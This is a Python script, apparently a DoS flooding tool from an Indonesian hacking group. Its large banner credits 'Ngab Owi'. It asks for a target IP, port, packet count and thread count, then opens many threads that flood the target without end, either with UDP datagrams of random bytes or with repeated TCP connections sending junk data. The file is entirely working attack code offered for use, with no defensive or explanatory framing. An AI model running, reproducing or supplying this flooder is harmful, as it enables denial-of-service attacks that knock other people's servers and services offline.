import random
import socket
import threading
import os

os.system("clear")
print("\033[91m     =========================================================   \n")
print("      { × } Author Tools : Ngab Owi                                    ")
print("      { × }  Community  : Cyber Team Indo                            \n")
print("     =========================================================   ")

print("••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••")
print("∆ 𝗡𝗚𝗔𝗕 𝗢𝗪𝗜 █ 𝗡𝗚𝗔𝗕 𝗢𝗪𝗜 █ 𝗡𝗚𝗔𝗕 𝗢𝗪𝗜     ∆  ")
print("∆ 𝗡𝗚𝗔𝗕 𝗢𝗪𝗜 █ 𝗡𝗚𝗔𝗕 𝗢𝗪𝗜 █ 𝗡𝗚𝗔𝗕 𝗢𝗪𝗜     ∆   ")
print("∆ 𝗡𝗚𝗔𝗕 𝗢𝗪𝗜 █ 𝗡𝗚𝗔𝗕 𝗢𝗪𝗜 █ 𝗡𝗚𝗔𝗕 𝗢𝗪𝗜     ∆    ")
print("\033[91m     ░                                                         ")

ip = str(input(" IP TARGET : "))
port = int(input(" PORT TARGET : "))
choice = str(input(" ATTACK ? (y/n) : "))
times = int(input(" PACKETS : "))
threads = int(input(" THREADS : "))
def run():
	data = random._urandom(1024)
	i = random.choice(("[***]","[^^^]","[!!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" NGAB OWI KIRIM PAKET CUY !!! ")
		except:
			print("[ ! ] LAH LAG ? HAYYU")

def run2():
	data = random._urandom(16)
	i = random.choice(("[T***]","[^^^]","[!!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"NGAB OWI KIRIM PAKET CUY !!!")
		except:
			s.close()
			print("[*] BUKAN NGAB OWI CUY !!!")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()